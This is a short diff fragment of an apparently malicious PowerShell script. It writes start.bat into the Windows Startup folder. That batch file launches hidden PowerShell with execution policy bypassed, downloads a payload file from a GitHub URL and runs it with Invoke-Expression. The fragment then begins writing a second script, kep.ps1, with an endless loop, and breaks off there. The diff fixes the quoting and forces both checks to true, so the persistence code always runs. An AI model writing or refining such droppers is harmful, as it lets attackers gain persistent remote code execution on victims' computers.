@@ -5,11 +5,11 @@ cd Programs
 cd Startup
 $ster=Test-Path start.bat
 $kepd=Test-Path kep.ps1
-if ($ster){
+if ($ster=true){
 New-Item start.bat
-Set-Content start.bat 'powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon'
+Set-Content start.bat "powershell  -w hidden -Exec ByPass -NoProfile -c (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/haycurt/VPSSTUFF/master/pay3.txt') | iNvokE-EXPresSIon"
 }
-if ($kepd){
+if ($kepd=true){
 New-Item kep.ps1
 Set-Content kep.ps1 '
      while ($true) {                  
